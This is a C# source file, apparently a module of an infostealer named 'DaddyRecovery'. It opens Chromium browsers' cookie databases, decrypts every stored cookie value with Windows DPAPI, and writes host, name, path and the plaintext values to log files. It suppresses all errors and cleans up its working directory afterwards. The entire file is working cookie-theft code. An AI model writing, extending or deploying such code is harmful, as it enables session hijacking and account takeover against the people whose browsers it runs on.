namespace DaddyRecovery.Browsers.Chromium
{
    using System;
    using System.Data;
    using System.Data.SQLite;
    using System.IO;
    using System.Security.Cryptography;
    using System.Text;
    using Helpers;

    public static class GetCookies
    {
        private const string COOKIES = "SELECT name, encrypted_value, path, expires_utc, last_access_utc, host_key FROM cookies";

        public static void Inizialize()
        {
            foreach (string v in Searcher.Database)
            {
                string save = CombineEx.CombinePath(GlobalPath.CookiesLogs, $"{CombineEx.GetFileNameWithoutExtension(v)}.txt");

                if (CombineEx.ExistsFile(v))
                {
                    try
                    {
                        using (var Connect = new SQLiteConnection($"Data Source={v};pooling=false;FailIfMissing=False"))
                        {
                            Connect.Open();
                            using (var ComText = new SQLiteCommand(COOKIES, Connect))
                            using (SQLiteDataReader reader = ComText.ExecuteReader())
                            {
                                if (!reader.HasRows) { continue; }
                                else { SaveLogs(v, save, reader); }
                            }
                            SQLiteConnection.ClearPool(Connect);
                        }
                    }
                    catch { }
                }
            }
            CombineEx.CreateOrDeleteDirectoryEx(false, CombineEx.CombinePath(GlobalPath.HomePath, "Cookies"));
        }

        private static void SaveLogs(string v, string save, SQLiteDataReader reader)
        {
            try
            {
                using (var SwLog = new StreamWriter(save))
                {
                    while (reader.Read())
                    {
                        SwLog.WriteLine($"Browser: {CombineEx.GetFileNameWithoutExtension(v)}");
                        SwLog.WriteLine($"HostKey: {reader[5]?.ToString()}");
                        SwLog.WriteLine($"Name: {reader[0]?.ToString()}");
                        SwLog.WriteLine($"Path: {reader[2]?.ToString()}");
                        SwLog.WriteLine($"Expires_utc: {(long)reader[3]}");
                        SwLog.WriteLine($"Last_access_utc: {(long)reader[4]}");
                        SwLog.WriteLine($"EncryptedValue: {DecryptTools.DecryptValue((byte[])reader[1], DataProtectionScope.LocalMachine, null)}");
                        SwLog.WriteLine();
                    }
                }
            }
            catch { }
        }
    }
}